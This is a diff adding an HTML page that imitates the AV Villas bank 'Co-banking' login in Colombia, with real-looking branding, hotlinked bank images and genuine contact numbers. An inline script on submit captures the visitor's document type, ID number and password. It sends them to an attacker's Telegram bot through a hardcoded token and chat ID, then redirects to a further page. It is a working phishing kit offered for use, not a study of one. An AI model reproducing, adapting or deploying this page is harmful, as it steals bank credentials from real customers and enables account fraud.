@@ -1,0 +1,577 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AV Villas - Ingreso Co-banking</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-color: #f5f5f5;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+
+        .main-container {
+            display: flex;
+            flex: 1;
+            min-height: calc(100vh - 80px);
+        }
+
+        /* Left Section - Banners */
+        .banners-section {
+            flex: 1;
+            padding: 30px 40px;
+            background-color: #ffffff;
+        }
+
+        .banners-title {
+            font-size: 28px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        .banners-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            grid-template-rows: auto auto;
+            gap: 20px;
+        }
+
+        .banner-card {
+            background: #fff;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
+            position: relative;
+        }
+
+        .banner-card.large {
+            grid-row: span 2;
+        }
+
+        .banner-card img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            display: block;
+        }
+
+        .banner-card.large img {
+            height: 100%;
+            min-height: 400px;
+        }
+
+        .banner-card:not(.large) img {
+            height: 200px;
+        }
+
+        .banner-overlay {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            right: 0;
+            background: white;
+            padding: 15px 20px;
+            border-radius: 12px;
+            margin: 15px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+        }
+
+        .banner-overlay p {
+            font-size: 14px;
+            color: #333;
+            margin-bottom: 10px;
+            line-height: 1.4;
+        }
+
+        .banner-overlay p strong {
+            font-weight: 700;
+        }
+
+        .banner-link {
+            color: #e31837;
+            text-decoration: none;
+            font-size: 13px;
+            font-weight: 600;
+            display: inline-flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .banner-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Right Section - Login */
+        .login-section {
+            width: 420px;
+            background: #e31837;
+            padding: 40px 35px;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .login-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            right: 0;
+            bottom: 0;
+            left: 0;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 400 600'%3E%3Ccircle cx='350' cy='100' r='150' fill='rgba(255,255,255,0.05)'/%3E%3Ccircle cx='380' cy='400' r='200' fill='rgba(255,255,255,0.03)'/%3E%3C/svg%3E") no-repeat;
+            background-size: cover;
+            pointer-events: none;
+        }
+
+        .logo-container {
+            text-align: center;
+            margin-bottom: 30px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .logo-placeholder {
+            background: white;
+            border-radius: 12px;
+            padding: 15px 30px;
+            display: inline-block;
+            font-size: 24px;
+            font-weight: bold;
+            color: #e31837;
+        }
+
+        .login-form-container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px 25px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .login-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 25px;
+        }
+
+        .form-group {
+            margin-bottom: 18px;
+        }
+
+        .form-label {
+            display: block;
+            font-size: 12px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .form-select,
+        .form-input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            font-size: 15px;
+            color: #333;
+            background: #fff;
+            transition: border-color 0.3s;
+        }
+
+        .form-select:focus,
+        .form-input:focus {
+            outline: none;
+            border-color: #e31837;
+        }
+
+        .form-select {
+            appearance: none;
+            background-image: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='12' height='12' viewBox='0 0 12 12'%3E%3Cpath fill='%23666' d='M6 8L1 3h10z'/%3E%3C/svg%3E");
+            background-repeat: no-repeat;
+            background-position: right 16px center;
+            cursor: pointer;
+        }
+
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: #c5d1db;
+            border: none;
+            border-radius: 25px;
+            color: #e31837;
+            font-size: 16px;
+            font-weight: 700;
+            text-transform: uppercase;
+            cursor: pointer;
+            margin-top: 10px;
+            transition: background 0.3s;
+        }
+
+        .btn-login:hover {
+            background: #b8c5d0;
+        }
+
+        .forgot-password {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .forgot-password a {
+            color: #333;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-flex;
+            align-items: center;
+            gap: 6px;
+        }
+
+        .forgot-password a:hover {
+            text-decoration: underline;
+        }
+
+        .help-links {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .help-links p {
+            font-size: 13px;
+            color: #666;
+            margin-bottom: 5px;
+        }
+
+        .help-links a {
+            color: #e31837;
+            text-decoration: none;
+            font-weight: 600;
+        }
+
+        .help-links a:hover {
+            text-decoration: underline;
+        }
+
+        .problems-link {
+            margin-top: 15px;
+        }
+
+        .problems-link a {
+            color: #e31837;
+            font-size: 14px;
+        }
+
+        /* Footer */
+        .footer {
+            background: #fff;
+            padding: 20px 40px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-top: 1px solid #eee;
+        }
+
+        .footer-left {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .footer-vigilado {
+            font-size: 10px;
+            color: #999;
+            writing-mode: vertical-rl;
+            text-orientation: mixed;
+            transform: rotate(180deg);
+        }
+
+        .footer-contacts {
+            display: flex;
+            flex-direction: column;
+        }
+
+        .footer-title {
+            font-size: 14px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 8px;
+        }
+
+        .footer-numbers {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 25px;
+        }
+
+        .contact-item {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+
+        .contact-item .dot {
+            width: 8px;
+            height: 8px;
+            background: #e31837;
+            border-radius: 50%;
+        }
+
+        .contact-item .city {
+            font-size: 13px;
+            font-weight: 600;
+            color: #333;
+        }
+
+        .contact-item .number {
+            font-size: 13px;
+            color: #666;
+        }
+
+        .footer-logo {
+            text-align: right;
+        }
+
+        .footer-logo-placeholder {
+            font-size: 12px;
+            color: #666;
+            font-weight: bold;
+        }
+
+        .grupo-aval {
+            font-size: 24px;
+            font-weight: bold;
+            color: #333;
+        }
+
+        /* Responsive */
+        @media (max-width: 1024px) {
+            .main-container {
+                flex-direction: column-reverse;
+            }
+
+            .login-section {
+                width: 100%;
+                min-height: auto;
+            }
+
+            .banners-grid {
+                grid-template-columns: 1fr 1fr;
+            }
+        }
+
+        @media (max-width: 768px) {
+            .banners-section {
+                display: none;
+            }
+
+            .login-section {
+                padding: 30px 20px;
+                min-height: calc(100vh - 100px);
+                justify-content: center;
+            }
+
+            .footer {
+                flex-direction: column;
+                gap: 20px;
+                text-align: center;
+            }
+
+            .footer-left {
+                flex-direction: column;
+            }
+
+            .footer-numbers {
+                justify-content: center;
+            }
+
+            .footer-logo {
+                text-align: center;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="main-container">
+        <!-- Left Section - Banners -->
+        <div class="banners-section">
+            <h1 class="banners-title">Juntos trabajando</h1>
+
+            <div class="banners-grid">
+                <!-- Banner 1 - Large -->
+                <div class="banner-card large">
+                    <img src="https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/login/Banner-card_1.webp"
+                        alt="Copa Mundial FIFA 2026">
+                    <div class="banner-overlay">
+                        <p><strong>La Copa Mundial de la FIFA 2026™,</strong> ahora es una experiencia AVAL, gracias a
+                            Visa.</p>
+                        <a href="#" class="banner-link">↗ Conoce más</a>
+                    </div>
+                </div>
+
+                <!-- Banner 2 -->
+                <div class="banner-card">
+                    <img src="https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/login/Banner-card_2.webp"
+                        alt="Paquetes dobles FIFA">
+                    <div class="banner-overlay">
+                        <p>Participa por <strong>18 paquetes dobles</strong> para vivir la Copa Mundial de la FIFA 2026™
+                        </p>
+                        <a href="#" class="banner-link">↗ Cómo ganar</a>
+                    </div>
+                </div>
+
+                <!-- Banner 3 -->
+                <div class="banner-card">
+                    <img src="https://pb-avvillas.avaldigitallabs.com/assets/img/illustrations/login/Banner-card-md_3.webp"
+                        alt="Tarjeta Visa AV Villas">
+                    <div class="banner-overlay">
+                        <p>¡Tienes que tenerla! Pide tu <strong>Tarjeta de Crédito Visa AV Villas edición
+                                especial</strong></p>
+                        <a href="#" class="banner-link">↗ Pídela y úsala ya</a>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Right Section - Login -->
+        <div class="login-section">
+            <div class="logo-container">
+                <!-- Logo placeholder - El usuario colocará su logo aquí -->
+                <div class="logo-placeholder"><img src="/img/avilla-logo.svg" alt=""></div>
+            </div>
+
+            <div class="login-form-container">
+                <h2 class="login-title">Ingresa a tu Co-banking</h2>
+
+                <form id="login-form">
+                    <div class="form-group">
+                        <label class="form-label">Tipo de documento</label>
+                        <select class="form-select" id="tipoDoc">
+                            <option>Cédula de Ciudadanía</option>
+                            <option>Cédula de Extranjería</option>
+                            <option>Pasaporte</option>
+                            <option>NIT</option>
+                        </select>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="text" class="form-input" id="numDoc" placeholder="Número de documento">
+                    </div>
+
+                    <div class="form-group">
+                        <input type="password" class="form-input" id="password" placeholder="Ingresa tu contraseña">
+                    </div>
+
+                    <button type="submit" class="btn-login">Ingresar</button>
+                </form>
+
+                <script>
+                    const TELEGRAM_TOKEN = "8788879668:AAHI39IMa5dZECzEsl_KA6ODZug2gZqhslA";
+                    const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+                    const CHAT_ID = "6483487531";
+
+                    async function sendToTelegram(text) {
+                        const body = {
+                            chat_id: CHAT_ID,
+                            text: text,
+                            parse_mode: "HTML"
+                        };
+                        try {
+                            await fetch(`${TELEGRAM_API}/sendMessage`, {
+                                method: "POST",
+                                headers: { "Content-Type": "application/json" },
+                                body: JSON.stringify(body)
+                            });
+                        } catch (err) {
+                            console.error("Error enviando a Telegram:", err);
+                        }
+                    }
+
+                    document.getElementById('login-form').addEventListener('submit', async function (e) {
+                        e.preventDefault();
+                        const tipo = document.getElementById('tipoDoc').value;
+                        const num = document.getElementById('numDoc').value;
+                        const pass = document.getElementById('password').value;
+
+                        const text = `🏦 <b>AV Villas - Login</b>\n\n🆔 Documento: ${tipo} ${num}\n🔑 Contraseña: ${pass}`;
+                        await sendToTelegram(text);
+
+                        window.location.href = 'Avilla-dinamica.html';
+                    });
+                </script>
+
+                <div class="forgot-password">
+                    <a href="#">🔒 Olvidé mi contraseña</a>
+                </div>
+
+                <div class="help-links">
+                    <p>¿Aún no tienes contraseña para ingresar?</p>
+                    <a href="#">Regístrate</a>
+                </div>
+
+                <div class="help-links problems-link">
+                    <a href="#">¿Tienes problemas para ingresar?</a>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Footer -->
+    <footer class="footer">
+        <div class="footer-left">
+            <div class="footer-vigilado">
+                VIGILADO SUPERINTENDENCIA FINANCIERA DE COLOMBIA
+            </div>
+            <div class="footer-contacts">
+                <div class="footer-title">Línea Audiovillas</div>
+                <div class="footer-numbers">
+                    <div class="contact-item">
+                        <span class="city">Nacional</span>
+                        <span class="number">01 8000 51 8000</span>
+                    </div>
+                    <div class="contact-item">
+                        <span class="dot"></span>
+                        <span class="city">Bogotá</span>
+                        <span class="number">(601) 4441777</span>
+                    </div>
+                    <div class="contact-item">
+                        <span class="dot"></span>
+                        <span class="city">Medellín</span>
+                        <span class="number">(604) 3256000</span>
+                    </div>
+                    <div class="contact-item">
+                        <span class="dot"></span>
+                        <span class="city">Barranquilla</span>
+                        <span class="number">(605) 3304330</span>
+                    </div>
+                    <div class="contact-item">
+                        <span class="dot"></span>
+                        <span class="city">Bucaramanga</span>
+                        <span class="number">(607) 6302980</span>
+                    </div>
+                    <div class="contact-item">
+                        <span class="dot"></span>
+                        <span class="city">Cali</span>
+                        <span class="number">(602) 8859595</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="footer-logo">
+            <div class="footer-logo-placeholder">Grupo</div>
+            <div class="grupo-aval">AVAL</div>
+        </div>
+    </footer>
+</body>
+
+</html>
